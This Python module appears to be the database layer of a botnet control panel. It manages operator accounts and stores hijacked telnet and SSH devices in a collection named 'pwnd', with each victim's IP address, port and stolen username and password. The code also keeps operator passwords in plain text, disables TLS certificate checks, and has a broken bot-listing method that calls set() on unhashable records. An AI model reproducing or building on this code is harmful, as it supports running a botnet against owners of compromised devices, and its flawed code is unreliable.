import pymongo, ssl

class Database:
    def __init__(self, connection_string):
        self.mongo_db = pymongo.MongoClient(connection_string, ssl=True, ssl_cert_reqs= ssl.CERT_NONE)
        self.user_database = self.mongo_db['user']
        self.bots_database = self.mongo_db['bots']

        # temp session storage
        self.online_user = []
        self.online_loader = []

        self.total_telnet_bots = 0
        self.total_ssh_bots = 0

    def create_user(self, username: str, password: str, grade: str):
        if not self.user_database['credential'].find_one({'username': username}):
            return True if self.user_database['credential'].insert_one({'username': username, 'password': password, 'grade': grade}) else False 
    
    def delete_user(self, username: str):
        return True if self.user_database['credential'].find_one_and_delete({'username': username}) else False

    def user_valid(self, username: str, password: str):
        user = self.user_database['credential'].find_one({'username': username})
        return True if user and user['password'] == password else False

    def get_user(self, username: str):
        return self.user_database['credential'].find_one({'username': username})

    def create_bot(self, username: str, password: str, ip: str, port: int, bot_type: str):
        db = self.bots_database['pwnd'][bot_type]
        
        if not db.find_one({'ip': ip}):
            db.insert_one({'username': username, 'password': password, 'ip': ip, 'port': port})
        
        return db.estimated_document_count()
    
    def get_telnet_bot(self):
        return list(set(self.bots_database['pwnd']['telnet'].find({})))